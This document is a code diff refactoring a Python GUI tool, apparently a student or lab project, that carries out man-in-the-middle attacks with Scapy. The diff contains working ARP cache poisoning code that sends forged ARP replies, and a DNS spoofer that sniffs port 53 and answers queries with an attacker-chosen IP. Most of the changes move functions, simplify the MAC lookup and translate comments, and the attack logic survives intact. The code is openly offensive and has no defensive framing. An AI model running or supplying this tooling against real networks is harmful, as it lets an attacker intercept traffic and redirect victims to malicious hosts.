@@ -2,9 +2,9 @@ import tkinter as tk
 from tkinter import messagebox
 import threading
 import time
-from scapy.all import send, get_if_hwaddr, conf, sniff, sr
+from scapy.all import send, get_if_hwaddr, conf, sniff
 from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import ARP, Ether, srp
+from scapy.layers.l2 import ARP
 from scapy.layers.dns import DNS, DNSRR
 
 
@@ -24,7 +24,7 @@ class MITMAttackApp:
         self.attacking = False
         self.show_main_gui()
 
-    def show_main_gui(self): # Choose ARP or DNS  主界面
+    def show_main_gui(self): # Main Interface 
         self.clear_gui()
         self.attack_type = tk.StringVar()
         tk.Label(self.master, text = "Select your MITM Attack Type").grid(row=0,column=1)
@@ -33,7 +33,7 @@ class MITMAttackApp:
         tk.Radiobutton(self.master, text="DNS Spoofing", variable=self.attack_type, value="DNS",
                        command=self.show_dns_gui).grid(row=2, column=0, columnspan=2, pady=10)
 
-    def show_arp_gui(self):  # ARP  arp界面
+    def show_arp_gui(self):  # ARP Interface 
         self.clear_gui()
         self.attacking = False
 
@@ -56,7 +56,7 @@ class MITMAttackApp:
         self.back_button = tk.Button(self.master, text="Back", command=self.back_to_main)
         self.back_button.grid(row=3, column=1)
 
-    def show_dns_gui(self):
+    def show_dns_gui(self):  # DNS Interface
         self.clear_gui()
         self.attacking = False
 
@@ -74,7 +74,7 @@ class MITMAttackApp:
         self.stop_button = tk.Button(self.master, text="Stop Attack", command=self.stop_attack)
         self.stop_button.grid(row=2, column=1)
 
-        self.log_text = tk.Text(self.master, height=20, width=70, state="disabled")
+        self.log_text = tk.Text(self.master, height=5, width=70, state="disabled")
         self.log_text.grid(row=4, column=0, columnspan=2, pady=10)
 
         self.back_button = tk.Button(self.master, text="Back", command=self.back_to_main)
@@ -92,7 +92,18 @@ class MITMAttackApp:
         elif self.attack_type.get() == "DNS":
             self.dns_attack()
 
-    def arp_attack(self):  # 执行中间人攻击
+    def start_attack(self):
+        if not self.attacking:
+            self.thread = threading.Thread(target=self.attack)
+            self.thread.start()
+            self.log("Attack started ... ")
+
+    def spoof(self, target_ip, host_ip): 
+        arp_response = ARP(op=2, psrc=host_ip, hwsrc=get_if_hwaddr(conf.iface), pdst=target_ip)
+        send(arp_response, verbose=False)
+        self.log(f"Send ARP response to {target_ip} pretening to be {host_ip}")
+
+    def arp_attack(self): 
         self.attacking = True
         target_ip = self.target_ip.get()
         host_ip = self.host_ip.get()
@@ -104,17 +115,6 @@ class MITMAttackApp:
             self.spoof(host_ip, target_ip)
             time.sleep(2)
 
-    def spoof(self, target_ip, host_ip):
-        target_mac = self.get_target_mac(target_ip)
-        arp_response = ARP(op=2, psrc=host_ip, hwsrc=get_if_hwaddr(conf.iface), pdst=target_ip, hwdst=target_mac)
-        send(arp_response, verbose=False)
-        self.log(f"Send ARP response to {target_ip} pretening to be {host_ip}")
-
-    def get_target_mac(self,target_ip):
-        arp_request = ARP(op=1, pdst=target_ip)  # ARP request
-        answered_list = sr(arp_request, timeout=1, verbose=False)[0]
-        return answered_list[0][1].hwsrc if answered_list else None
-
     def capture_arp_packets(self):
         sniff(prn=self.process_arp_packet, filter=f"ip host {self.target_ip.get()}", store=0, stop_filter=lambda x: not self.attacking)
 
@@ -125,30 +125,23 @@ class MITMAttackApp:
 
     def dns_attack(self):
         self.attacking = True
-        threading.Thread(target=self.capture_dns_packets, args=("DNS",)).start()
+        threading.Thread(target=self.capture_dns_packets).start()
 
     def capture_dns_packets(self):
+        self.log(f"DNS Capturing...")
+        sniff(filter="port 53", prn=self.process_dns_packet, stop_filter=lambda _: not self.attacking)
+
+    def process_dns_packet(self, packet):
         target_ip = self.dns_target_ip.get()
         fake_ip = self.fake_ip.get()
-
-        def process_dns_packet(packet):
-            if packet.haslayer(DNS) and packet[DNS].qr == 0:
-                dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
-                               UDP(dport=packet[UDP].sport, sport=53) / \
-                               DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                                   an=DNSRR(rrname=packet[DNS].qd.qname, rdata=fake_ip))
-                send(dns_response, verbose=False)
-                self.log(f"Spoofed DNS response sent for {packet[DNS].qd.qname} to {fake_ip}")
-
-        sniff(filter=f"udp port 53 and ip dst {target_ip}", prn=process_dns_packet,
-              stop_filter=lambda _: not self.attacking)
-
-
-    def start_attack(self):  # Start the attack
-        if not self.attacking:
-            self.thread = threading.Thread(target=self.attack)
-            self.thread.start()
-            self.log("Attack started ... ")
+        if (packet.haslayer(DNS) and packet[DNS].qr == 0):
+            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
+                           UDP(dport=packet[UDP].sport, sport=53) / \
+                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
+                               an=DNSRR(rrname=packet[DNS].qd.qname, rdata=fake_ip))
+            print(f"Using fake IP:{fake_ip}")
+            send(dns_response, verbose=False)
+            self.log(f"Spoofed DNS response sent for {packet[DNS].qd.qname} to {fake_ip}")
 
     def stop_attack(self):  # Stop the attack
         self.attacking = False
